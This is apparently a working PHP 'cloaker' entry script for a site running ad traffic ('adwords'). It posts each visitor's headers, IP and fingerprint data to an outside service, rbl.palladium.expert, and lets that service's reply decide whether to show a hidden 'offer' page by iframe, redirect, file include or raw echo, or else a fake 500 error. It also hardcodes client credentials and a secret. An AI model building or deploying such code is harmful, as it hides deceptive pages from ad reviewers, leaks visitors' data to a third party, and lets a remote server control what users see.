<?php

// Технические запросы (API, WebSocket, ассеты, heartbeat) не должны проходить через кло —
// они от уже залогиненного юзера, не первый заход на сайт.
$uri = strtok($_SERVER['REQUEST_URI'] ?? '/', '?');
$host = strtolower((string) preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? ''));
$isLocalDevHost = in_array($host, ['127.0.0.1', 'localhost', '::1'], true);

if (! function_exists('public_env_value')) {
    function public_env_value(string $key): ?string
    {
        static $values = null;

        if ($values === null) {
            $values = [];
            $path = __DIR__ . '/../.env';

            if (is_readable($path)) {
                foreach (file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [] as $line) {
                    $line = trim($line);

                    if ($line === '' || str_starts_with($line, '#') || ! str_contains($line, '=')) {
                        continue;
                    }

                    [$envKey, $envValue] = explode('=', $line, 2);
                    $values[trim($envKey)] = trim(trim($envValue), "\"'");
                }
            }
        }

        return $values[$key] ?? null;
    }
}

if (! function_exists('public_env_hosts')) {
    function public_env_hosts(?string $value): array
    {
        if ($value === null || trim($value) === '') {
            return [];
        }

        return array_values(array_filter(array_map(function (string $entry): string {
            $entry = strtolower(trim($entry));
            $parsedHost = parse_url($entry, PHP_URL_HOST);

            return $parsedHost ? strtolower($parsedHost) : preg_replace('/:\d+$/', '', $entry);
        }, explode(',', $value))));
    }
}

$bypassHosts = public_env_hosts(public_env_value('CLOAKER_BYPASS_HOSTS'));

if ($isLocalDevHost || in_array($host, $bypassHosts, true)) {
    require_once __DIR__ . '/offer.php';
    exit;
}

$bypassCloaker = str_starts_with($uri, '/api/')
              || str_starts_with($uri, '/broadcasting/')
              || str_starts_with($uri, '/heartbeat')
              || str_starts_with($uri, '/build/')
              || str_starts_with($uri, '/assets/')
              || str_starts_with($uri, '/storage/')
              || str_starts_with($uri, '/bank-photos/');

if ($bypassCloaker) {
    require_once __DIR__ . '/offer.php';
    exit;
}

$isTarget = (new RequestHandlerClient())->run();



class RequestHandlerClient
{
    const SERVER_URL = 'https://rbl.palladium.expert';

    /**
     * @param int    $clientId
     * @param string $company
     * @param string $secret
     *
     * @return void
     * @throws \Exception
     */
    public function run()
    {
        $headers = [];
        $headers['request'] = $this->collectRequestData();
        $headers['jsrequest'] = $this->collectJsRequestData();
        $headers['server'] = $this->collectHeaders();
        $headers['auth']['clientId'] = 6059;
        $headers['auth']['clientCompany'] = "UysFDTpxZvi8YK5vVFCX";
        $headers['auth']['clientSecret'] = "NjA1OVV5c0ZEVHB4WnZpOFlLNXZWRkNYY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==";
        $headers['server']['bannerSource'] = 'adwords';

        return $this->curlSend($headers);
    }

    /**
     * @param array<string, mixed> $params
     *
     * @return bool
     * @throws \Exception
     */
    public function curlSend(array $params)
    {
        $answer = false;
        $curl = curl_init(self::SERVER_URL);
        if ($curl) {
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));

            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($curl, CURLOPT_TIMEOUT, 4);
            curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
            curl_setopt($curl, CURLOPT_FORBID_REUSE, true);

            $result = curl_exec($curl);
            if ($result) {
				$serverOut = json_decode(
					$result,
					true
				);
				$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

				if ($status == 200 && is_array($serverOut)) {
					$answer = $this->handleServerReply($serverOut);
					return $answer;
				}
			}
        }

		$this->getDefaultAnswer();
        return $answer;
    }

    protected function handleServerReply($reply)
    {
        $result = (bool) ($reply['result'] ? $reply['result'] : 0);

        if (
			isset($reply['mode']) &&
			(
				(isset($reply['target'])) ||
				(isset($reply['content']) && !empty($reply['content']))
			)
		) {
            $target = $reply['target'];
            $mode = $reply['mode'];
            $content = $reply['content'];

            if (preg_match('/^https?:/i', $target) && $mode == 3) {
                // do fallback to mode2
                $mode = 2;
            }

            if ($result && $mode == 1) {
				$this->displayIFrame($target);
				exit;
			} elseif ($result && $mode == 2) {
				header("Location: {$target}");
				exit;
			} elseif ($result && $mode == 3) {
				$target = parse_url($target);
				if (isset($target['query'])) {
					parse_str($target['query'], $_GET);
				}
				$this->hideFormNotification();
				require_once $this->sanitizePath($target['path']);
				exit;
			} elseif ($result && $mode == 4) {
				echo $content;
				exit;
			} else if (!$result && $mode == 5) {
				//
			} elseif ($mode == 6) {
				//
			} else {
				$path = $this->sanitizePath($target);
				if (!$this->isLocal($path)) {
					header("404 Not Found", true, 404);
				} else {
					$this->hideFormNotification();
					require_once $path;
				}
				exit;
			}
        }

        return $result;
    }

	private function hideFormNotification()
	{
		echo "";
		//echo "<script>if ( window.history.replaceState ) {window.history.replaceState( null, null, window.location.href );}</script>";
	}

	private function displayIFrame($target) {
		$target = htmlspecialchars($target);
		echo "<html>
                  <head>
                  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
                  </head>
                  <body>" .
                  $this->hideFormNotification() .
                  "<iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>
                  </body>
              </html>";
	}

    private function sanitizePath($path)
    {
        if ($path[0] !== '/') {
            $path = __DIR__ . '/' . $path;
        } else {
            $path = __DIR__ . $path;
        }
        return $path;
    }

    private function isLocal($path)
    {
        // do not validate url via filter_var
        $url = parse_url($path);

        if (!isset($url['scheme']) || !isset($url['host'])) {
            return true;
        } else {
            return false;
        }
    }


    /**
     * Get all HTTP server headers and few additional ones
     *
     * @return mixed
     */
    protected function collectHeaders()
    {
        $userParams = [
            'REMOTE_ADDR',
            'SERVER_PROTOCOL',
            'SERVER_PORT',
            'REMOTE_PORT',
            'QUERY_STRING',
            'REQUEST_SCHEME',
            'REQUEST_URI',
            'REQUEST_TIME_FLOAT',
            'X_FB_HTTP_ENGINE',
            'X_PURPOSE',
            'X_FORWARDED_FOR',
            'X_WAP_PROFILE',
            'X-Forwarded-Host',
            'X-Forwarded-For',
            'X-Frame-Options',
        ];

        $headers = [];
        foreach ($_SERVER as $key => $value) {
            if (in_array($key, $userParams) || substr_compare('HTTP', $key, 0, 4) == 0) {
                $headers[$key] = $value;
            }
        }

        return $headers;
    }

    private function collectRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['data'])) {
            	$data = json_decode($_POST['data'], true);
            	if (JSON_ERROR_NONE !== json_last_error()) {
            		$data = json_decode(
						stripslashes($_POST['data']),
						true
					);
            	}
                unset($_REQUEST['data']);
            }

            if (!empty($_POST['crossref_sessionid'])) {
                $data['cr-session-id'] = $_POST['crossref_sessionid'];
                unset($_POST['crossref_sessionid']);
            }
        }

        return $data;
    }

    public function collectJsRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['jsdata'])) {
                $data = json_decode($_POST['jsdata'], true);
                if (JSON_ERROR_NONE !== json_last_error()) {
                    $data = json_decode(
                        stripslashes($_POST['jsdata']),
                        true
                    );
                }
                unset($_REQUEST['jsdata']);
            }
        }
        return $data;
    }

    /**
     * Default answer for the curl request in case of fault
     *
     * @return bool
     */
    private function getDefaultAnswer()
    {
		header($_SERVER["SERVER_PROTOCOL"] . ' 500 Internal Server Error', true, 500);
		echo "<h1>500 Internal Server Error</h1>
		<p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>";
		exit;
    }
}
